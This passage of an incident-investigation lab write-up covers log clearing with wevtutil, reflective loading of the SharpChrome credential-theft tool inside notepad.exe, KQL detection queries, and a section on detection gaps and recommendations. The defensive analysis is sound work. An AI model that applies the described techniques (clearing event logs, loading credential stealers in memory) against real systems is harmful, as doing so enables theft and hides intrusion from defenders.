| summarize FirstSeen=min(Timestamp), Hash=any(SHA256)
```

</details>

---

<details>
<summary><strong>🚩 Flag 37: Log Clearing (Defense Evasion via Event Log Tampering)</strong></summary>

### 🎯 Objective  
Identify which Windows event logs were cleared by the attacker to evade detection.

---

### 📌 Finding  
Following confirmation of initial compromise activity on **as-pc1**, analysis pivoted to identifying defense evasion behaviors occurring immediately after payload execution.

Process telemetry revealed repeated execution of the native Windows utility **wevtutil.exe**, which is commonly abused by attackers to remove forensic artifacts by clearing Windows event logs.

Command-line parsing of execution artifacts revealed explicit log clearing commands targeting multiple core Windows event logs. These commands were executed within minutes of initial payload activity, strongly indicating deliberate anti-forensics behavior.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Host | as-pc1 |
| Time Window | 2026-01-15 05:05–05:15 UTC |
| Utility Used | wevtutil.exe |
| Cleared Logs | System, Security, Application |

**Aggregated telemetry output:**
```
DeviceName: as-pc1  
ClearedLogs: ["System","Security","Application"]
```

This confirms multiple critical Windows logs were deliberately cleared during early attacker activity.

---

### 🧠 Query
```kql
let start=datetime(2026-01-15 05:05:00);
let end=datetime(2026-01-15 05:15:00);
DeviceProcessEvents
| where Timestamp between (start..end)
| where DeviceName =~ "as-pc1"
| where FileName =~ "wevtutil.exe"
| where ProcessCommandLine has_any (" cl ","clear-log")
| extend ClearedLog = extract(@"(?i)\bcl\s+([A-Za-z0-9\-\/]+)", 1, ProcessCommandLine)
| where isnotempty(ClearedLog)
| summarize ClearedLogs=make_set(ClearedLog) by DeviceName
```

</details>

---

<details>
<summary><strong>🚩 Flag 38: Reflective Loading (In-Memory Code Execution)</strong></summary>

### 🎯 Objective  
Identify the telemetry artifact indicating reflective code loading during the intrusion.

---

### 📌 Finding  
After identifying layered attacker tradecraft including LOLBins, masquerading, and log clearing, analysis pivoted toward detecting **fileless execution techniques** across compromised hosts.

Defender Advanced Hunting telemetry revealed repeated events with the ActionType:

**ClrUnbackedModuleLoaded**

This event indicates that a managed (.NET) assembly was loaded directly into memory without an associated file on disk — a hallmark of reflective loading and fileless malware execution.

Multiple occurrences were observed across compromised hosts, with metadata indicating in-memory module loading from native processes such as PowerShell and Notepad.

Notably, one event contained module metadata referencing:

**SharpChrome**

This strongly indicates in-memory execution of offensive tooling via reflective loading.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| ActionType | ClrUnbackedModuleLoaded |
| Hosts Observed | as-pc1, as-srv |
| Example Process | powershell.exe, notepad.exe |
| In-Memory Module | SharpChrome |
| Execution Type | Fileless (.NET reflective loading) |

**Example telemetry artifact:**
```
DeviceName: as-pc1  
InitiatingProcessFileName: notepad.exe  
ModuleILPathOrName: SharpChrome
```

This confirms unmanaged module loading without a backing file, consistent with reflective in-memory execution.

---

### 🧠 Query
```kql
let start=datetime(2026-01-15);
let end=datetime(2026-02-23);
DeviceEvents
| where Timestamp between (start..end)
| where DeviceName in~ ("as-pc1","as-pc2","as-srv")
| where ActionType == "ClrUnbackedModuleLoaded"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, AdditionalFields
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 39: Memory Tool (In-Memory Credential Theft)</strong></summary>

### 🎯 Objective  
Identify the credential theft tool that was loaded directly into memory during the intrusion.

---

### 📌 Finding  
Following detection of reflective loading activity, analysis pivoted to identifying the **specific in-memory tooling** executed by the attacker.

Reflective loading telemetry (`ClrUnbackedModuleLoaded`) was parsed to extract module metadata embedded in Defender’s AdditionalFields JSON payload. This allows identification of offensive tooling even when no executable exists on disk.

Telemetry revealed a reflective loading event on **as-pc1** where an unmanaged .NET assembly was executed directly in memory. The extracted module name was:

**SharpChrome**

SharpChrome is a GhostPack credential theft utility used to extract browser secrets such as saved credentials, cookies, and DPAPI-protected data.

The event occurred under a legitimate host process, indicating fileless execution designed to evade detection.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Timestamp (UTC) | 2026-01-15T05:09:53.5714672Z |
| Host | as-pc1 |
| User | sophie.turner |
| Host Process | notepad.exe |
| In-Memory Tool | SharpChrome |
| Execution Type | Reflective loading (fileless) |

**Telemetry artifact:**
```
ActionType: ClrUnbackedModuleLoaded  
Tool: SharpChrome  
Parent Process: notepad.exe
```

This confirms unmanaged module execution directly from memory without a backing file.

---

### 🧠 Query
```kql
let start=datetime(2026-01-15);
let end=datetime(2026-02-23);
DeviceEvents
| where Timestamp between (start..end)
| where ActionType == "ClrUnbackedModuleLoaded"
| extend Tool = tostring(parse_json(AdditionalFields).ModuleILPathOrName)
| where Tool =~ "SharpChrome"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, Tool
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 40: Host Process (Reflective Injection Target)</strong></summary>

### 🎯 Objective  
Identify the legitimate process that hosted the in-memory credential theft assembly during reflective loading.

---

### 📌 Finding  
Following confirmation that the credential theft tool **SharpChrome** was executed via reflective loading, analysis pivoted to identifying the **host process** that contained the in-memory assembly.

Reflective loading telemetry preserves process lineage metadata, including the process responsible for hosting unmanaged modules loaded directly into memory. Aggregation of reflective loading events associated with SharpChrome revealed a consistent hosting process.

The process identified was:

**notepad.exe**

This indicates the attacker injected the malicious .NET assembly into a trusted Windows binary rather than executing it from a suspicious parent process. Using a benign host process is a common defense evasion technique that allows attackers to blend malicious activity into normal system behavior.

This aligns with earlier telemetry showing the attacker leveraging legitimate binaries throughout the intrusion lifecycle.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Reflective Tool | SharpChrome |
| Hosting Process | notepad.exe |
| Execution Type | In-memory reflective loading |
| Detection Source | ClrUnbackedModuleLoaded telemetry |

**Aggregated reflective loading metadata:**
```
Hosts: ["notepad.exe"]
```

This confirms that the in-memory credential theft assembly was hosted inside a legitimate Windows process.

---

### 🧠 Query
```kql
let start=datetime(2026-01-15);
let end=datetime(2026-02-23);
DeviceEvents
| where Timestamp between (start..end)
| where ActionType == "ClrUnbackedModuleLoaded"
| extend Tool = tostring(parse_json(AdditionalFields).ModuleILPathOrName)
| where Tool =~ "SharpChrome"
| summarize Hosts=make_set(InitiatingProcessFileName)
```

</details>

## 🚨 Detection Gaps & Recommendations

### Observed Gaps

- **LOLBin Abuse Visibility Gaps:** Native tools (certutil, net, schtasks, wmic, wevtutil) were used throughout the intrusion without detection, enabling payload delivery, persistence, and defense evasion.
- **Unauthorized Remote Access Tooling:** AnyDesk deployment across multiple hosts was not flagged, indicating no controls for unapproved remote administration software.
- **Credential Abuse Detection Failure:** Valid accounts were reused for lateral movement without alerts for abnormal cross-host authentication patterns.
- **Masquerading Blind Spot:** A payload renamed as `RuntimeBroker.exe` executed from `C:\Users\Public` without detection, highlighting lack of path-based execution monitoring.
- **Persistence Creation Visibility Gaps:** Scheduled task persistence (`MicrosoftEdgeUpdateCheck`) and local account creation (`svc_backup`) occurred without alerts.
- **Fileless Attack Detection Weakness:** Reflective loading events (`ClrUnbackedModuleLoaded`) were present in telemetry but not operationalized into detections.
- **Log Tampering Detection Failure:** Security and System logs were cleared using `wevtutil.exe` without triggering alerts or immutable logging protections.
- **Data Staging Blind Spot:** Sensitive document access followed by archive creation (`Shares.7z`) was not detected, indicating missing behavioral analytics for collection activity.

---

### Recommendations

**Immediate (0–30 days)**
- Alert on LOLBin abuse (certutil downloads, schtasks creation, net user changes, wevtutil log clearing)
- Detect and block unauthorized remote access tools (e.g., AnyDesk)
- Forward logs to immutable centralized storage
- Rotate compromised credentials and enforce MFA on privileged accounts

**Short-Term (30–90 days)**
- Deploy UEBA for lateral movement and abnormal authentication detection
- Correlate persistence indicators (tasks, accounts, autoruns)
- Create detections for reflective loading and GhostPack-style tooling
- Monitor sensitive file access followed by compression activity

**Long-Term (90+ days)**
- Implement application allowlisting and zero-trust principles
- Deploy DLP for sensitive document monitoring
- Introduce deception artifacts (honeypot files, honey credentials)
- Conduct adversary emulation exercises to validate detection coverage






